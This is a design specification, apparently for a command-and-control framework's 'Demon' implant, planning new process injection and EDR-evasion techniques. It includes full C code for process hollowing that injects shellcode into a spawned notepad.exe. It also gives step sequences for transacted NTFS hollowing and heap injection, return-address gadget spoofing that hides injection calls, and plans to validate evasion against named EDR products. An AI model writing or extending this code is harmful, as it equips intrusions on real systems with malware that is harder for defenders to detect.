# HVC-036 — Injection Engine Improvements

**Status:** Pending

---

## Problem

The current Demon injection infrastructure (`inject/Inject.c`) provides three techniques — `CreateRemoteThread`, `NtCreateThreadEx` via indirect syscall, and `NtQueueApcThread` APC injection — all of which are well-catalogued by EDR vendors:

- **Remote thread and APC injection are high-signal.** EDRs hook `NtCreateThreadEx` and monitor for cross-process thread creation originating from non-standard parent images. APC injection requires a thread in alertable state, which limits target selection and is detected by monitoring `NtQueueApcThread` into foreign processes.
- **Call stack spoofing is limited.** `Spoof.c` implements a single gadget pattern (`FF 23` — `jmp [rbx]`). If that gadget is unavailable in a target process's loaded modules (e.g., stripped or non-standard load order), spoofing silently fails. Only one gadget type is searched.
- **No process hollowing.** The most reliable "spawn and inject" technique — where a sacrificial process is started suspended, its image replaced, and execution redirected — is absent. Without it, all injection into new processes requires `VirtualAllocEx` with visible RWX transitions in the target process, which is a strong EDR signal.
- **No transacted hollowing (TxF).** NTFS transaction-backed section mapping produces a mapping whose backing store appears legitimate on disk after the transaction is rolled back, evading tools that correlate in-memory PE images with on-disk files.

---

## Scope

| Layer | Files |
|-------|-------|
| Demon | `payloads/Demon/inject/Inject.c`, `payloads/Demon/src/core/Spoof.c`, `payloads/Demon/src/core/Syscalls.c`, `payloads/Demon/include/Demon.h`, `payloads/Demon/include/common/Defines.h`, `payloads/Demon/CMakeLists.txt` |
| New files | `payloads/Demon/inject/InjectHollow.c`, `payloads/Demon/inject/InjectTxf.c` |

No teamserver or client changes are needed for Sub-1 through Sub-3. Sub-4 is Demon-only. New injection modes are exposed to the operator via the existing injection mode selector in the `inject` command.

---

## Design

### Sub-1: Process Hollowing

**Goal:** Spawn a target process in suspended state, unmap its original image, write Demon shellcode into the vacated virtual address space, redirect the main thread's instruction pointer to the shellcode entry point, and resume.

**Function signature:**

```c
BOOL InjectHollow(
    LPWSTR  SpawnPath,      // full path to spawn (e.g., L"C:\\Windows\\System32\\notepad.exe")
    PBYTE   Shellcode,      // shellcode bytes to inject
    SIZE_T  ShellcodeLen    // length of shellcode
);
```

**Implementation sequence:**

```c
BOOL InjectHollow( LPWSTR SpawnPath, PBYTE Shellcode, SIZE_T ShellcodeLen )
{
    STARTUPINFOW         Si   = { .cb = sizeof(Si) };
    PROCESS_INFORMATION  Pi   = { 0 };
    PROCESS_BASIC_INFORMATION Pbi = { 0 };
    ULONG_PTR ImageBase = 0;
    PVOID  AllocBase = NULL;
    CONTEXT Ctx = { .ContextFlags = CONTEXT_FULL };

    // 1. Spawn target process suspended.
    if ( ! Instance.Win32.CreateProcessW(
            SpawnPath, NULL, NULL, NULL, FALSE,
            CREATE_SUSPENDED | CREATE_NO_WINDOW,
            NULL, NULL, &Si, &Pi ) )
        return FALSE;

    // 2. Retrieve PEB address via NtQueryInformationProcess.
    Instance.Syscall.NtQueryInformationProcess(
        Pi.hProcess, ProcessBasicInformation,
        &Pbi, sizeof(Pbi), NULL );

    // 3. Read PEB.ImageBaseAddress (offset 0x10 on x64, 0x08 on x86).
    Instance.Win32.ReadProcessMemory(
        Pi.hProcess,
        (PVOID)( (ULONG_PTR)Pbi.PebBaseAddress + 0x10 ),
        &ImageBase, sizeof(ImageBase), NULL );

    // 4. Unmap original image.
    Instance.Syscall.NtUnmapViewOfSection( Pi.hProcess, (PVOID)ImageBase );

    // 5. Allocate RW region at preferred base (fall back to any address on failure).
    AllocBase = (PVOID)ImageBase;
    Instance.Syscall.NtAllocateVirtualMemory(
        Pi.hProcess, &AllocBase, 0,
        &ShellcodeLen, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE );

    // 6. Write shellcode.
    Instance.Win32.WriteProcessMemory(
        Pi.hProcess, AllocBase, Shellcode, ShellcodeLen, NULL );

    // 7. Flip to RX.  Never use PAGE_EXECUTE_READWRITE.
    ULONG Old = 0;
    Instance.Syscall.NtProtectVirtualMemory(
        Pi.hProcess, &AllocBase, &ShellcodeLen, PAGE_EXECUTE_READ, &Old );

    // 8. Redirect RIP to shellcode entry.
    Instance.Syscall.NtGetContextThread( Pi.hThread, &Ctx );
    Ctx.Rip = (DWORD64)AllocBase;
    Instance.Syscall.NtSetContextThread( Pi.hThread, &Ctx );

    // 9. Resume.
    Instance.Syscall.NtResumeThread( Pi.hThread, NULL );

    Instance.Win32.NtClose( Pi.hProcess );
    Instance.Win32.NtClose( Pi.hThread );
    return TRUE;
}
```

**Syscall requirements:**

| Syscall | Already in `Syscalls.c`? | Action |
|---------|--------------------------|--------|
| `NtQueryInformationProcess` | Yes (verify) | None |
| `NtUnmapViewOfSection` | No | Add — see below |
| `NtAllocateVirtualMemory` | Yes | None |
| `NtProtectVirtualMemory` | Yes | None |
| `NtGetContextThread` | Verify | Add if absent |
| `NtSetContextThread` | Verify | Add if absent |
| `NtResumeThread` | Verify | Add if absent |

**New hash to add to `Defines.h`:**

```c
// DJB2 of "NTUNMAPVIEWOFSECTION" (uppercase)
#define H_FUNC_NTUNMAPVIEWOFSECTION    0x... // compute: djb2("NTUNMAPVIEWOFSECTION")
```

Compute the DJB2 value at spec implementation time using the project's existing hash utility or the Python snippet in `Demon.md`. Do not hard-code an assumed value here.

**New source file:** `payloads/Demon/inject/InjectHollow.c`

Wire into the injection dispatch in `Inject.c` as a new `INJECTION_MODE_HOLLOW` case alongside the existing `INJECTION_MODE_SPAWN`, `INJECTION_MODE_SYSCALL`, and `INJECTION_MODE_APC` cases.

---

### Sub-2: Transacted Hollowing (TxF)

**Goal:** Use NTFS transaction semantics to write a modified PE into a transacted file, create a section from that file handle (so the mapped image appears to come from a legitimate file path), then roll back the transaction so the on-disk file reverts to its original content. EDR tools that correlate `NtMapViewOfSection` mappings with on-disk file content will see only the legitimate original file.

**Protocol sequence:**

```
1. NtCreateTransaction
       → HANDLE hTx

2. NtCreateFile (with hTx in extended attributes)
       → create / open a transacted copy of target file (e.g., notepad.exe)

3. WriteFile(hTxFile, payload_pe, ...)
       → overlay the PE with our payload within the transaction

4. NtCreateSection(SEC_IMAGE, hTxFile)
       → create image section backed by the transacted (modified) file

5. NtMapViewOfSection into target process
       → maps the payload image; appears to reference notepad.exe

6. NtRollbackTransaction(hTx)
       → disk file is atomically restored; only in-memory mapping retains payload

7. Start execution (NtCreateThreadEx or APC into mapped entry point)
```

**New syscalls required:**

| Syscall | Notes |
|---------|-------|
| `NtCreateTransaction` | In `ntdll.dll`; add to `Syscalls.c` |
| `NtRollbackTransaction` | In `ntdll.dll`; add to `Syscalls.c` |
| `NtCreateSection` | Verify in `Syscalls.c`; add if absent |
| `NtMapViewOfSection` | Verify in `Syscalls.c`; add if absent |

New DJB2 hashes needed for `Defines.h`:

```c
#define H_FUNC_NTCREATETRANSACTION     0x...
#define H_FUNC_NTROLLBACKTRANSACTION   0x...
```

**Compatibility note:**

> TxF (Transactional NTFS) has been deprecated since Windows Vista SP1 (KB967351). Microsoft has stated it may be removed in a future Windows release. As of Windows 11 24H2 it remains functional. Test on each target OS version. Operators should verify TxF availability in the target environment before relying on this technique.

**New source file:** `payloads/Demon/inject/InjectTxf.c`

Exposed as `INJECTION_MODE_TXF` in the injection dispatch. Implementation should gracefully fall back to standard process hollowing (`INJECTION_MODE_HOLLOW`) if `NtCreateTransaction` fails with `STATUS_NOT_IMPLEMENTED`.

---

### Sub-3: Expanded Call Stack Spoofing

**Current state:** `Spoof.c` implements `SpoofRetAddr()` which scans a single loaded module for the byte pattern `FF 23` (`jmp [rbx]`). If the gadget is not found, spoofing silently returns without modifying the return address.

**Problems:**
1. A single gadget pattern is fragile — module load order, ASLR, and stripped images all affect availability.
2. No call stack spoofing is applied to injection syscalls, only to the sleep obfuscation path.
3. There is no way for callers to request an alternative gadget if the primary is unavailable.

**Enhancements:**

#### 3a. Multiple gadget patterns

```c
// Defines.h or Spoof.h
typedef enum _SPOOF_GADGET {
    SPOOF_GADGET_JMP_RBX    = 0,   // FF 23        jmp [rbx]          (current)
    SPOOF_GADGET_CALL_RAX   = 1,   // FF D0        call rax
    SPOOF_GADGET_JMP_RAX    = 2,   // FF E0        jmp rax
    SPOOF_GADGET_JMP_R11    = 3,   // 41 FF 23     jmp [r11]  (REX.B prefix)
} SPOOF_GADGET;
```

#### 3b. New API surface in `Spoof.c`

```c
// Scan ntdll .text section for a gadget of the specified type.
// Returns NULL if not found.
PVOID SpoofFindGadget( SPOOF_GADGET Type );

// Apply call stack spoof using a pre-found gadget address.
// Caller is responsible for ensuring Gadget != NULL before calling.
VOID  SpoofRetAddrWith( PVOID Gadget );
```

`SpoofFindGadget` scans the `.text` section of `ntdll.dll` (already mapped; base resolved via PEB walk without `LoadLibrary`). For two-byte patterns (`FF 23`, `FF D0`, `FF E0`), a simple byte scan suffices. For `41 FF 23`, scan for three bytes. Return the address of the first match.

The existing `SpoofRetAddr()` is preserved as a compatibility wrapper that calls `SpoofFindGadget(SPOOF_GADGET_JMP_RBX)` then `SpoofRetAddrWith(gadget)`.

#### 3c. Apply spoofing to injection calls

Wrap `NtCreateThreadEx`, `NtQueueApcThread`, and `NtResumeThread` calls in injection paths with a `SpoofFindGadget` + `SpoofRetAddrWith` sequence. Prefer `SPOOF_GADGET_JMP_R11` as a secondary gadget (less common in public signatures); fall back to `SPOOF_GADGET_JMP_RBX` if R11 gadget is not found.

```c
PVOID Gadget = SpoofFindGadget( SPOOF_GADGET_JMP_R11 );
if ( ! Gadget )
    Gadget = SpoofFindGadget( SPOOF_GADGET_JMP_RBX );

if ( Gadget )
    SpoofRetAddrWith( Gadget );

Instance.Syscall.NtCreateThreadEx( ... );
```

**Testing call stack spoof:** Attach WinDbg or x64dbg to a process that has been injected into. At the return address on the thread stack, verify the frame points into a legitimate `ntdll.dll` code region rather than into a `VirtualAlloc`-backed shellcode range. Use `.frame` and `k` commands in WinDbg to inspect the call stack.

---

### Sub-4: Heap Injection (Experimental)

**Goal:** Allocate memory within the target process's existing default heap instead of creating a new `VirtualAlloc` region. Many EDRs and memory scanners flag new executable regions created with `VirtualAllocEx`; writing into an existing heap block is a lower-signal operation.

**Sequence:**

```
1. NtQueryInformationProcess(ProcessHeapInformation) → default heap address
2. HeapAlloc via WriteProcessMemory into target (or use RtlCreateHeap in-process and pass handle)
3. Write shellcode bytes into heap block with WriteProcessMemory
4. VirtualProtectEx: flip heap block from PAGE_READWRITE to PAGE_EXECUTE_READ
   (heap blocks are RW by default)
5. NtCreateThreadEx / APC pointing to heap block entry
```

**Implementation note on step 1:** `ProcessHeapInformation` is not a standard `PROCESSINFOCLASS` in all SDK versions. The value is `0x7` in internal documentation. Verify against the `ProcessBasicInformation` path — it may be more reliable to read `PEB.ProcessHeap` via `ReadProcessMemory` after obtaining the PEB address (same approach as in `InjectHollow`).

**Reliability caveat (document explicitly):**

> Heap injection is **experimental**. Windows heap implementations (NT Heap and Segment Heap) may compact, coalesce, or free blocks under memory pressure or during internal GC cycles. A heap block that is freed while the thread is executing inside it will produce an access violation. Do not use heap injection for long-running implants. Use it only for short shellcode stubs that immediately allocate stable memory and jump out.

**New source:** Add `InjectHeap()` to `inject/Inject.c` or a new `inject/InjectHeap.c`. Mark as experimental in comments.

---

## File Map

| File | Change |
|------|--------|
| `payloads/Demon/inject/Inject.c` | Add `INJECTION_MODE_HOLLOW`, `INJECTION_MODE_TXF`, `INJECTION_MODE_HEAP` dispatch cases |
| `payloads/Demon/inject/InjectHollow.c` | New — process hollowing: `InjectHollow()` |
| `payloads/Demon/inject/InjectTxf.c` | New — transacted hollowing: `InjectTxf()` |
| `payloads/Demon/src/core/Spoof.c` | Add `SpoofFindGadget()`, `SpoofRetAddrWith()`; add gadget type enum; apply to injection paths |
| `payloads/Demon/include/common/Defines.h` | Add `H_FUNC_NTUNMAPVIEWOFSECTION`, `H_FUNC_NTCREATETRANSACTION`, `H_FUNC_NTROLLBACKTRANSACTION`; add `SPOOF_GADGET` enum or move to `Spoof.h` |
| `payloads/Demon/src/core/Syscalls.c` | Add `NtUnmapViewOfSection`, `NtCreateTransaction`, `NtRollbackTransaction`; verify `NtGetContextThread`, `NtSetContextThread`, `NtResumeThread`, `NtCreateSection`, `NtMapViewOfSection` |
| `payloads/Demon/include/Demon.h` | Add function pointer fields for new syscalls in the INSTANCE syscall table |
| `payloads/Demon/src/core/Runtime.c` | Resolve new function pointers using existing DJB2 hash resolution infrastructure |
| `payloads/Demon/CMakeLists.txt` | Add `inject/InjectHollow.c` and `inject/InjectTxf.c` to source list |

---

## Tests

- **Process hollowing (Sub-1):** On a test Windows VM, invoke `InjectHollow(L"C:\\Windows\\System32\\notepad.exe", calc_shellcode, calc_len)`. Verify `notepad.exe` process appears in Task Manager but executes the injected payload. Verify no RWX memory regions appear in the process via `VirtualQuery` enumeration — only RX regions.

- **TxF (Sub-2):** Invoke `InjectTxf` with a test PE payload targeting `notepad.exe`. After execution begins, use `strings` or a hex editor on the on-disk `notepad.exe` to verify it is unmodified. Verify the in-memory section maps the payload PE rather than the original `notepad.exe` image (compare PE headers).

- **Call stack spoof — gadget presence (Sub-3):** Call `SpoofFindGadget(SPOOF_GADGET_JMP_RAX)` and verify a non-NULL pointer is returned that lies within the `ntdll.dll` address range. Repeat for each gadget type.

- **Call stack spoof — stack inspection (Sub-3):** Inject a payload that sleeps for 30 seconds. Attach WinDbg. Inspect the suspended thread's call stack with `k`. Verify return addresses on the stack fall within legitimate module ranges (not within allocated shellcode regions).

- **Heap injection (Sub-4):** Inject a short shellcode stub that immediately calls `VirtualAlloc(RWX)` and copies itself to stable memory before returning control. Verify the stub executes without access violation in the short window between heap block allocation and the jump to stable memory.

---

## Notes

- **Never use `PAGE_EXECUTE_READWRITE`.** All memory allocations in new and existing injection paths must follow the RW-then-flip-to-RX pattern. This is a hard constraint from project policy (see memory/feedback_no_rwx.md). Reviewers must verify this in every PR touching injection code.
- **All new syscalls must use indirect syscall infrastructure.** Do not import `NtUnmapViewOfSection` or any new NT function via the IAT or a direct `GetProcAddress` call. Every new syscall follows the same pattern as existing entries in `Syscalls.c`: add the DJB2 hash to `Defines.h`, add the function pointer to the INSTANCE syscall table in `Demon.h`, resolve it in `Runtime.c` using the existing hash-based resolution, and invoke it via `Instance.Syscall.*`.
- **Process hollowing (Sub-1) is the highest-value item.** It is the most commonly requested technique among Demon operators and the most practical addition for current engagements. Implement and ship independently.
- **TxF (Sub-2) requires compatibility testing.** Verify on Windows 10 21H2, Windows 10 22H2, and Windows 11 23H2 / 24H2 before releasing. If `NtCreateTransaction` returns `STATUS_NOT_IMPLEMENTED`, fall back silently to standard hollowing and log the fallback in the agent's console.
- **Expanded call stack spoofing (Sub-3)** should be tested specifically against Elastic EDR, CrowdStrike Falcon, and Windows Defender as part of any validation pass — these are the tools most likely to inspect return addresses in thread contexts.
- **Heap injection (Sub-4) is marked experimental** and should not be presented to operators as a primary technique. Gate it behind a compile-time `#ifdef DEMON_EXPERIMENTAL` flag until stability is validated.
